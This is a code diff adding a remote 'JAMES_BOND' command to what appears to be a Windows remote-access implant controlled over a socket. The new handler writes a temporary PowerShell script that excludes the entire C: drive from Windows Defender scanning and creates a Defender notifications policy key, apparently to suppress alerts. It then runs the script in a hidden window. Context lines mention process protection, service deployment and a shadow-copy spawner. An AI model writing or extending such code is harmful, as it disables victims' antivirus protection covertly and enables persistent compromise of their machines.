@@ -270,6 +270,26 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             result = "[Failed to write temp script]";
         }
     }
+    else if (strcmp(cmd, "JAMES_BOND") == 0) {
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char psPath[MAX_PATH];
+        snprintf(psPath, sizeof(psPath), "%s\\jamesbond.ps1", tempPath);
+        
+        FILE *f = fopen(psPath, "w");
+        if (f) {
+            fprintf(f, "Add-MpPreference -ExclusionPath 'C:'\n");
+            fprintf(f, "New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Force | Out-Null\n");
+            fprintf(f, "Write-Host 'James Bond: exclusion set and notification key created' -ForegroundColor Green\n");
+            fclose(f);
+            
+            char runCmd[MAX_PATH + 64];
+            snprintf(runCmd, sizeof(runCmd), "powershell -WindowStyle Hidden -File \"%s\"", psPath);
+            result = sys_run_command(runCmd);
+        } else {
+            result = "[Failed to write temp script]";
+        }
+    }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
         /* Start watchdog only once, when user explicitly deploys */
